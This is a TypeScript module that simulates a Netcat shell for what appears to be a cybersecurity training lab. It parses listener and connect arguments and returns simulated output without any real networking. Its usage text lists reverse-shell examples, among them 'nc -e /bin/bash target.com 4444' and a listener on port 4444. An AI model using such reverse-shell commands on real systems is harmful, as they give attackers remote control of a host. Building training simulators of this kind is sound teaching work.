// ── shells/nc/NcSession.ts ────────────────────────────────────────
// Implementación modular del shell Netcat (nc)
// Parseo en ./ncArgs.ts (compartido con tools/nc).

import type { ShellSession, ShellContext, ShellResult } from '../ShellSession';
import { parseNcListener, parseNcConnect, resolveNcConnect } from './ncArgs';

// ── Estado del shell NC ───────────────────────────────────────────
export interface NcState {
  listening: boolean;
  port?: number;
  connected: boolean;
}

// ── Helper para parsear argumentos de listener ────────────────────
// (movido a ./ncArgs.ts — fuente única compartida con tools/nc)

// ── Implementación del shell NC ───────────────────────────────────
export const ncSession: ShellSession<NcState> = {
  name: 'nc',

  getPrompt(_state: NcState): string {
    return '';
  },

  createInitialState(): NcState {
    return { listening: false, connected: false };
  },

  executeCommand(input: string, state: NcState, _ctx: ShellContext): { result: ShellResult; newState: NcState } {
    const parts = input.trim().split(/\s+/);

    // Sin argumentos: mostrar uso
    if (parts.length === 0 || !parts[0]) {
      return {
        result: {
          output: `usage: nc [-options] hostname port
       nc -l [-options] port

General options:
  -l              Listen for incoming connection
  -n              Don't perform DNS lookups
  -v              Verbose (print commands before executing)
  -p port         Specify port

Examples:
  nc -nlvp 4444           Listen on port 4444 (common for reverse shells)
  nc -lvnp 4444           (same, different order)
  nc target.com 80        Connect to target.com on port 80
  nc -e /bin/bash target.com 4444   Reverse shell payload
  nc -l -p 9999           Listen on port 9999 (without verbose)`,
          closeSession: true,
        },
        newState: state,
      };
    }

    // Parsear modo listener
    const listenerResult = parseNcListener(parts);

    if (listenerResult.isListener) {
      if (listenerResult.error) {
        return {
          result: { output: listenerResult.error, isError: true, closeSession: true },
          newState: state,
        };
      }

      const port = listenerResult.port!;

      // NcSession ahora es libre - solo reporta el listener iniciado
      // El labValidator detectará el blockingCommand y validará la misión
      return {
        result: {
          output: `listening on [any] ${port} ...`,
          blockingCommand: {
            message: `⏳ Escuchando en puerto ${port}... Presiona Ctrl+C para cancelar`,
            listeningPort: port,
          },
        },
        newState: { listening: true, port, connected: false },
      };
    }

    // Modo conexión: el estado del puerto virtual manda
    const outcome = resolveNcConnect(parseNcConnect(parts), _ctx);
    return {
      result: {
        output: outcome.output,
        isError: outcome.isError ? true : undefined,
        closeSession: true,
      },
      newState: state,
    };
  },

  isActive(state: NcState): boolean {
    return state.listening || state.connected;
  },
};